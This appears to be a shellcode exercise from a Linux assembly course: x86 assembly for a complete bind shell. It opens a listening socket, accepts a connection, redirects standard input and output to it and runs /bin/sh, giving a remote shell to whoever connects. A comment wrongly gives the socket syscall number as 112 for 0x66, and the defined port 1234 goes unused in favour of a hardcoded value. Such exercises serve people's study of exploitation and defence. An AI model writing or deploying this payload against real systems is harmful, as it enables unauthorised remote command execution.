; SLAE-X 
; thanks to writesup 
; syscall here /usr/include 



%define _port 1234


global _start 


_start: 
	; syscall socket is 112 so 0x66 in hex 
	; syscall create socket fd argument is 0x1 in ebx 
	mov    ebx,0x1
	push   0x0
	push   0x1
	push   0x2
	mov    ecx,esp
	mov    eax,0x66
	int    0x80
	; saving file descriptor received 
	mov    edi,eax


	; syscall socket bind 
	mov    ebx,0x2
	push   0x0
	push word  0xb315
	push word  0x2
	mov    ecx,esp
	push   0x10
	push   ecx
	push   edi
	mov    ecx,esp
	mov    eax,0x66
	int    0x80

	; syscall socket listen 
	push   0x0
	push   edi
	mov    ecx,esp
	mov    eax,0x66
	mov    ebx,0x4
	int    0x80

	; syscall socket accept 
mov    eax,0x66
mov    ebx,0x5
push   0x0
push   0x0
push   edi
mov    ecx,esp
int    0x80

	; duplicating fd from socket to stdin stdout stderr 
	mov    ebx,eax
	mov    ecx,0x2
loop: 
	mov    eax,0x3f
	int    0x80
	dec    ecx
	jns    loop 

	; syscall execve with arguments /bin/sh null terminated and a null string for envp 
	mov    eax,0xb
	push   0x0
	push   0x68732f2f
	push   0x6e69622f
	mov    ebx,esp
	push   0x0
	mov    edx,esp
	push   ebx
	mov    ecx,esp
	int    0x80

	; exit cleanly 
	mov    eax,0x1
	mov    ebx,0x0
	int    0x80
